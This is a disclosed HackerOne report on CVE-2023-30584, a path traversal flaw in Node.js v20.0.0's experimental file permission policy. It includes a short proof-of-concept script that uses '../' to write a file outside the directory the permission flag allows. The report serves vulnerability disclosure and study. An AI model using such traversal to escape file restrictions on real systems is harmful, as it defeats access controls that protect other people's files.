# [H] Filesystem experimental permissions policy does not handle path traversal cases.

## Summary
Severity: High (CVSS 7.7)
Program: Node.js
Weakness: Path Traversal
Reporter: haxatron1
State: resolved
Disclosed: 2023-07-20T20:57:35.392Z
CVE: CVE-2023-30584
Source: https://hackerone.com/reports/1952978

## Details
Consider the following command on Node v20.0.0:
```
node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js
```
This command is intended to restrict write access to only files present in the directory /home/kali/restricted

However if we have the following poc.js:
```
const fs = module.require('fs')
fs.writeFileSync("/home/kali/restricted/../secret.txt", "Target Overwritten!")
```
This apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.

## Impact

Path traversal when checking experimental file permission policy
